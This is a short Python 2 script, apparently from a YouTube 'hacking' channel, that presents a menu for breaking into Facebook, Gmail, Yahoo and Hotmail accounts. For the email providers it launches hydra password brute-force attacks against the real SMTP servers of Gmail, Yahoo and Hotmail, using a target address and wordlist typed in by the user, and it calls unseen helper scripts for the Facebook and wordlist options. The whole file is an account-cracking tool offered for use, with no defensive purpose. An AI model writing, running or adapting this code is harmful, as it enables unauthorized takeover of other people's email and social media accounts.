import os , sys , time
print(" ")
print(" ")
print(" Youtube     :      Hack   With Uzumaki ")
print " "
print " "
print " "
print "                 [1] Hack Facebook             " 
print "                 [2] Hack Gmail                "
print "                 [3] Hack Yahoo                "
print "                 [4] Hack Hotmail              "
print "                 [5] Make Password list [Wordlist]"
print "                 [0] Exit                     "
print " "
print " "
i = raw_input(" Enter Number   :  ")
if i == '1':
 import os
 os.system('python2 datacode.py')
if i == '2':
 import os
 os.system('pkg install hydra -y')
 email = raw_input("[*] Email : ")
 word = raw_input("[*] Wordlist : ")
 os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
 sys.exit()
if i == '3':
 email = raw_input("[*] Email : ")                                                               
 word = raw_input("[*] Wordlist : ")
 os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
 sys.exit()
if i == '4':
 email = raw_input("[*] Email : ")
 word = raw_input("[*] Wordlist : ")
 os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
 sys.exit()
if i == '5':
 os.system('python datalist.py')
if i == '00':
 import os
 os.system('exit')
if i == '0':
 import os
 os.system('exit')
